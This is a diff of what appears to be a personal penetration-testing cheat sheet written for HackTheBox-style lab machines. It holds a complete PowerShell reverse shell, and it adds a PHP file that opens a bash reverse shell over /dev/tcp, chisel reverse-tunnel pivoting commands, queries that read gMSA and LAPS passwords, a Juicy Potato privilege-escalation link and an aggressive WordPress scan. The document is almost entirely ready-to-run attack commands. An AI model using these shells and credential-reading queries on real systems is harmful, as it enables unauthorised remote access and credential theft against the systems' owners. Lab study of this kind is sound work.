@@ -49,7 +49,7 @@ Use this exploit windows/local/ms16_075_reflection_juicy
 
 PHP TY[E JUGG;ING 
 https://0xdf.gitlab.io/2018/06/23/htb-falafel.html
-
+https://github.com/ohpe/juicy-potato/releases/tag/v0.1
 
 Default powershell reverse shell 
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.19',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
@@ -71,6 +71,7 @@ openssl pkcs12 -in legacyy_dev_auth.pfx -out certificate.pem -nokeys -clcerts
 
 Powershell History File 
 C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+Get-ADServiceAccount -Identity <AccountName> -Properties 'msds-managedpassword'
 
 
 Read Password
@@ -79,3 +80,27 @@ Get-ADComputer DC01 -property 'ms-mcs-admpwd'
 
 
 REfer this when playing with sql injection 
+
+
+chisel - Pivoting
+- run in server mode in attacker machine
+- run in client mode in victim machine 
+Command 
+Attacker# chisel server --socks5 --reverse 
+Victim  # chisel.exe client — fingerprint <key> <AttackerIP>:8080 R:<attacker_port>:127.0.0.1:3306
+
+Hashidentifier
+Patator 
+
+
+spwn shell in crontab privilege escalation 
+<?php
+system("bash -c 'bash -i >& /dev/tcp/$IP/9002 0>&1'");
+echo "attacker";
+?>
+
+Shell improve 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+wpscan
+wpscan --url http://backdoor.htb/ --disable-tls-checks -e ap --plugins-detection aggressive 
